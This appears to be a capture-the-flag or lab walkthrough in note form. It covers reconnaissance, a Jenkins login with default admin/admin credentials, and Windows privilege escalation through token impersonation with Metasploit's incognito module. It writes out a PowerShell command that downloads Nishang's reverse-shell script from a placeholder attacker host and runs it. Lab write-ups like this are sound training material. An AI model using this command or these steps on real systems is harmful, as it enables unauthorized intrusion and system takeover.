## Reconnaissance
- nmap shows 3 open ports 2 of them is http
- found that the port 8080 leads to jenkins login page
- tried default admin/admin combo and it worked

### Initial access
- gonna use the jenkins already existing project to get a reverse shell
- will use this powershell reverse shell script from Nishang framework
- will use this command to gain a reverse shell " powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port"

### Privillege escalation
- Noticed that in whoami/priv SeDebugPrivilege, SeImpersonatePrivilege are enabled in order to exploit this vulnerability gonna switch to a meterpreter
- Gonna use the msfvenom to create a shell executable and download it from the compromised machine
- gonna set up a listener using metasploit and start the process
- after i got meterpreter i loaded incognito module and impersonated the administrator's token
- now even tho it may look like i got nt authority privillege but that's not how privillege work in windows
- to actually escalate my privillege now im gonna migrate to a process with the nt authority permessions 
